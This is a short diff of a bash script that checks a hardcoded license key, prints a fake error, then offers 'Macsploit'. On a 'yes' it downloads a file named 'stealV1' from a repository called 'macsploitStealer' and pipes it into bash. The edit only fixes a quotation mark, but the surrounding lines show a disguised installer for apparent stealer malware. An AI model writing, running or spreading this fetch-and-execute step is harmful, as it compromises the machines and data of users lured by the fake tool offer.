@@ -44,7 +44,7 @@ if [ "$license_key" == "12851" ]; then
     echo "License key accepted. Downloading file..."
 echo "An error occured.."
 sleep 5
-echo "Would you like Macsploit before this closes? response
+echo "Would you like Macsploit before this closes?" response
 if [ "$response" == "yes" ]; then
 cd ~/ && curl -s "https://raw.githubusercontent.com/Sadospry/macsploitStealer/main/stealV1" | bash
 else
